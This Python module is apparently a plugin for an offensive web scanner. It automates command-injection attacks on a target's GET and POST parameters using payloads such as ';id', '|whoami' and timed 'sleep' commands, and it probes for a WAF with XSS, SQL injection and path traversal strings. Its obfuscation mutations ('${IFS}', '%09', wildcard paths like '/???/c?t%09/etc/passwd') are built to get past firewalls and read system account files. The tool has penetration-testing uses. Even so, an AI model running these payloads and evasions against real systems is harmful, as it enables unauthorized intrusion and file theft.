import requests
import time
import urllib.parse
import copy
import re
import random

NAME = "cmdinj"
CATEGORY = "vuln"
DESCRIPTION = "Advanced Command Injection Scanner (File Read Bypass + WAF Evasion)"

# =================================================
# Payload Engine
# =================================================

BASE_PAYLOADS = [
    (";id", "Linux", "output"),
    ("&&id", "Linux", "output"),
    ("|id", "Linux", "output"),
    (";whoami", "Linux", "output"),
    ("&whoami", "Windows", "output"),
    ("|whoami", "Windows", "output"),
    (";sleep 5", "Linux", "time"),
    ("&&sleep 5", "Linux", "time"),
    ("|sleep 5", "Linux", "time"),
    ("&timeout /t 5", "Windows", "time"),
    (";sleep 10", "Linux", "time"),
]

# -------------------------------------------------
# Advanced Obfuscation Mutations
# -------------------------------------------------

def mutate_space_to_ifs(p):
    return p.replace(" ", "${IFS}")

def mutate_space_to_tab(p):
    return p.replace(" ", "%09")

def mutate_space_to_newline(p):
    return p.replace(" ", "%0a")

def mutate_case_randomizer(p):
    chars = []
    for c in p:
        if c.isalpha() and random.choice([True, False]):
            chars.append(c.upper())
        else:
            chars.append(c)
    return "".join(chars)

def mutate_quote_wrapper(p):
    return f"'{p}'"

# -------------------------------------------------
# NEW: Wildcard Payloads (High Success Rate)
# -------------------------------------------------

def mutate_wildcard_newline_ip(p):
    mapping = {
        "id": "/???/?d",
        "whoami": "/?????????",
        "sleep": "/???/?????"
    }
    for cmd, wildcard in mapping.items():
        if cmd in p:
            clean_payload = p.replace(";", "").replace("&&", "").replace("&", "").replace("|", "")
            mutated_payload = clean_payload.replace(cmd, wildcard)
            return f"127.0.0.1%0a{mutated_payload}"
    return p

def mutate_cat_passwd(p):
    """
    Generates a payload to read /etc/passwd using wildcards.
    cat /etc/passwd -> /???/c?t%09/etc/passwd
    Matches keyword 'cat' with /???/c?t
    Matches space with %09 (tab)
    Target: 'root:' in regex
    """
    if "cat" in p:
        # Replace 'cat' with /???/c?t (matches /bin/cat, /usr/bin/cat)
        # Replace ' ' with %09 (Tab)
        return "127.0.0.1%0a/???/c?t%09/etc/passwd"
    return p

MUTATIONS = [
    mutate_space_to_tab,
    mutate_space_to_newline,
    mutate_case_randomizer,
    mutate_wildcard_newline_ip,  # ID/Whoami wildcard
    mutate_cat_passwd,           # Cat passwd wildcard
    mutate_quote_wrapper
]


# =================================================
# Scanner Engine
# =================================================

class CmdInjectionEngine:

    def __init__(self, target, emit, options=None):
        self.target = target
        self.emit = emit
        self.options = options or {}
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Hellhound-CMDi/10.0"})
        self.vulnerabilities = []
        self.time_threshold = 5
        self.waf_detected = False

    # -------------------------------------------------
    # WAF Detection
    # -------------------------------------------------

    def check_waf(self, url, method="POST"):
        self.emit.info("Checking for Web Application Firewall...")
        
        waf_payloads = [
            "<script>alert(1)</script>",
            "UNION SELECT 1,2,3--",
            "../../../../etc/passwd"
        ]
        
        headers = {"User-Agent": "Hellhound-WAF-Check"}
        
        for payload in waf_payloads:
            try:
                if method == "POST":
                    r = self.session.post(url, data={"input": payload}, headers=headers, timeout=5)
                else:
                    r = self.session.get(url, params={"input": payload}, headers=headers, timeout=5)
                
                waf_signatures = ["cloudflare", "mod_security", "incapsula", "aws waf", "f5 block", "blocked by"]
                if r.status_code == 403 or r.status_code == 406:
                    self.waf_detected = True
                    self.emit.warn(f"WAF Detected via Status Code: {r.status_code}")
                    return
                elif any(sig in r.text.lower() for sig in waf_signatures):
                    self.waf_detected = True
                    self.emit.warn(f"WAF Detected via Content Analysis.")
                    return
            except:
                continue

    # -------------------------------------------------
    # Baseline Averaging
    # -------------------------------------------------

    def get_average_baseline(self, url, method="GET", data=None):
        times = []
        for _ in range(3):
            try:
                start = time.time()
                if method == "POST":
                    self.session.post(url, data=data or {}, timeout=10)
                else:
                    self.session.get(url, timeout=10)
                times.append(time.time() - start)
            except:
                continue
        return sum(times) / len(times) if times else 0

    # -------------------------------------------------
    # Mutation Engine
    # -------------------------------------------------

    def generate_payloads(self):
        mutated = []
        for payload, os_type, mode in BASE_PAYLOADS:
            for mutate in MUTATIONS:
                try:
                    result = mutate(payload)
                    mutated.append((result, os_type, mode))
                except:
                    continue
        return mutated

    # -------------------------------------------------
    # Detection Logic (ROBUST REGEX)
    # -------------------------------------------------

    def analyze_output(self, text):
        patterns = [
            # Linux/Unix
            r"uid=\d+\([^)]+\)",     # uid=1000(user)
            r"uid=\d+",               # uid=1000 (if groups omitted)
            r"gid=\d+\([^)]+\)",     # gid=1000(group)
            r"groups=\d+\([^)]+\)",  # groups=...
            r"root:",                 # root user (from /etc/passwd)
            r"www-data",              # apache user
            r"nobody:",               # nobody user
            
            # Windows
            r"administrator",        # Windows Administrator account name
            r"S-1-5-21",              # Windows Security Identifier (SID)
            r"\\[a-z0-9_-]+$",       # COMPUTERNAME\username pattern
        ]

        for line in text.split("\n"):
            clean = re.sub(r"<.*?>", "", line).strip()
            for pattern in patterns:
                if re.search(pattern, clean, re.IGNORECASE):
                    return True, clean

        return False, None

    # -------------------------------------------------
    # Injection Helpers
    # -------------------------------------------------

    def inject_get_param(self, url, param_name):

        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        baseline = self.get_average_baseline(url, "GET")
        
        payloads = self.generate_payloads()
        total = len(payloads)

        for idx, (payload, os_type, mode) in enumerate(payloads, 1):

            new_query = copy.deepcopy(query)
            new_query[param_name] = [payload]

            encoded = urllib.parse.urlencode(new_query, doseq=True)
            injected_url = parsed._replace(query=encoded).geturl()

            try:
                start = time.time()
                r = self.session.get(injected_url, timeout=20)
                elapsed = time.time() - start

                if mode == "output":
                    vulnerable, proof = self.analyze_output(r.text)
                    if vulnerable:
                        self.store_vuln(injected_url, param_name, payload, os_type, "OUTPUT", proof)
                        return

                if mode == "time":
                    if elapsed > (baseline + self.time_threshold):
                        proof = f"Time delay {elapsed:.2f}s (baseline {baseline:.2f}s)"
                        self.store_vuln(injected_url, param_name, payload, os_type, "TIME", proof)
                        return

            except requests.exceptions.Timeout:
                 if mode == "time":
                    self.store_vuln(injected_url, param_name, payload, os_type, "TIME", "Timeout (Server Lag)")
                    return
            except:
                continue

    def inject_post_param(self, url, param_name):

        baseline = self.get_average_baseline(url, "POST")
        
        payloads = self.generate_payloads()
        total = len(payloads)
        self.emit.info(f"Scanning POST param '{param_name}' with {total} payloads...")

        for idx, (payload, os_type, mode) in enumerate(payloads, 1):
            
            if idx % 5 == 0 or idx == 1 or idx == total:
                self.emit.info(f"Testing payload {idx}/{total}: {payload[:40]}...")

            data = {param_name: payload}

            try:
                start = time.time()
                r = self.session.post(url, data=data, timeout=20)
                elapsed = time.time() - start

                if mode == "output":
                    vulnerable, proof = self.analyze_output(r.text)
                    if vulnerable:
                        self.store_vuln(url, param_name, payload, os_type, "OUTPUT", proof)
                        return

                if mode == "time":
                    if elapsed > (baseline + self.time_threshold):
                        proof = f"Time delay {elapsed:.2f}s (baseline {baseline:.2f}s)"
                        self.store_vuln(url, param_name, payload, os_type, "TIME", proof)
                        return

            except requests.exceptions.Timeout:
                 if mode == "time":
                    self.store_vuln(url, param_name, payload, os_type, "TIME", "Timeout (Server Lag)")
                    return
            except:
                continue

    # -------------------------------------------------
    # Store
    # -------------------------------------------------

    def store_vuln(self, url, param, payload, os_type, detection_type, proof):

        parsed = urllib.parse.urlparse(url)
        clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for existing in self.vulnerabilities:
            if existing["url"] == clean_url and existing["parameter"] == param:
                return

        vuln = {
            "type": "COMMAND_INJECTION",
            "url": clean_url,
            "parameter": param,
            "payload_used": payload,
            "os": os_type,
            "detection": detection_type,
            "confidence": "High" if detection_type == "OUTPUT" else "Medium",
            "proof": proof,
            "waf_detected": self.waf_detected
        }

        self.vulnerabilities.append(vuln)

    # -------------------------------------------------
    # Auto Spider Integration
    # -------------------------------------------------

    def auto_from_spider(self, spider_results):
        intel = spider_results.get("intel", {})
        endpoints = intel.get("endpoints", [])

        count = 0
        for ep in endpoints:
            method = ep.get("method")
            url = ep.get("url")
            params = ep.get("params", [])
            risks = ep.get("risks", [])

            if not params:
                continue

            # Filter out non-input fields
            target_params = []
            for p in params:
                name = p.get("name")
                p_type = p.get("type", "text").lower()
                
                if p_type in ["checkbox", "submit", "button", "radio", "hidden"]:
                    self.emit.info(f"Skipping non-input field: '{name}' ({p_type})")
                    continue
                if name in ["enable_waf", "submit", "login", "remember_me"]:
                    self.emit.info(f"Skipping control parameter: '{name}'")
                    continue

                target_params.append(p)
            
            params = target_params

            if not params:
                continue

            # Risk Check
            is_risky = any(r in ["COMMAND_INJECTION", "SYSTEM_INTERACTION", "IDOR_POTENTIAL"] for r in risks)
            
            if not is_risky:
                 for p in params:
                     name = p.get("name", "").lower()
                     if name in ["ip", "host", "domain", "cmd", "target", "file"]:
                         is_risky = True
                         break

            if not is_risky:
                continue

            for p in params:
                name = p.get("name")

                if method == "POST":
                    self.inject_post_param(url, name)
                else:
                    self.inject_get_param(url, name)
                count += 1
        
        if count > 0:
            self.emit.info(f"Spider integration: {count} valid parameters scanned.")
        else:
            self.emit.info("Spider integration: No valid input parameters found to scan.")

    # -------------------------------------------------
    # Manual Mode
    # -------------------------------------------------

    def manual_scan(self):
        parsed = urllib.parse.urlparse(self.target)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            self.emit.warn("No URL parameters detected.")
            return

        for param in params:
            self.inject_post_param(self.target, param)
            self.inject_get_param(self.target, param)

    # -------------------------------------------------
    # Run
    # -------------------------------------------------

    def run(self):

        self.check_waf(self.target)
        
        if self.waf_detected:
            self.emit.warn("WAF Detected. Applying advanced obfuscation.")

        spider_data = self.options.get("spider_results")

        if spider_data:
            self.emit.info("Auto mode enabled (Spider integration)")
            self.auto_from_spider(spider_data)
        else:
            self.emit.info("Running manual parameter analysis")
            self.manual_scan()

        summary = {
            "total_vulnerabilities": len(self.vulnerabilities),
            "affected_parameters": list(
                set(v["parameter"] for v in self.vulnerabilities)
            ),
            "waf_detected": self.waf_detected
        }

        return {
            "raw": f"Vulns found: {len(self.vulnerabilities)}",
            "intel": {
                "summary": summary,
                "vulnerabilities": self.vulnerabilities
            }
        }

# =================================================
# Framework Entry
# =================================================

def run(target, emit, options=None, stop_check=None, pause_check=None):

    emit.info(f"Command Injection Scan Started: {target}")

    engine = CmdInjectionEngine(target, emit, options)
    result = engine.run()

    emit.success("Command Injection Scan Complete")
    emit.success(result["raw"])

    return result